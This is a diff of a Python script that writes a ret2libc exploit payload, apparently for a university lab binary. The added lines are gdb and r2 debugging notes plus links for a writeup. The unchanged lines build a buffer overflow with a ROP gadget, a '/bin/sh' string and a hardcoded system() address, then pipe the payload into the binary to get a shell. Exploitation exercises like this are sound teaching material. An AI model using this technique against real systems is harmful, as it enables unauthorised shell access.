@@ -1,5 +1,14 @@
 #!/usr/bin/env python3
 
+# basic analysis with r2, then switch to gdb gef.
+# info sharedlibrary
+#  /lib64/ld-linux-x86-64.so.2
+#  /lib/x86_64-linux-gnu/libc.so.6
+# info proc map
+#  # libc start: 0x7ffff7dd6000 (niedrigste der vorhandenen)
+# ls -l /lib/x86_64-linux-gnu/libc.so.6
+#  lrwxrwxrwx 1 root root 12 Feb 15 12:21 /lib/x86_64-linux-gnu/libc.so.6 -> libc-2.33.so
+
 # p system
 # 0x7ffff7e1f860
 system_call = b"\x00\x00\x7f\xff\xf7\xe1\xf8\x60"[::-1]
@@ -42,7 +51,11 @@ payload = buffer + backup_base_pointer + rop_pop_rsi_ret + bin_sh_string + syste
 f = open("payload", "wb")
 f.write(payload)
 
+# links for the writeup:
 # https://sharkmoos.medium.com/binary-exploitation-exploiting-ret2libc-328eefb0421b
+# https://nuc13us.wordpress.com/2015/12/26/return-to-libc-in-64-bit/
+# https://moodle.technikum-wien.at/pluginfile.php/1353835/mod_resource/content/3/Tipps_Debugging_Linux_v1.0.pdf
+
 # ropper --search 'pop rdi; ret;
 # cat payload - | ./bin
 # pwd
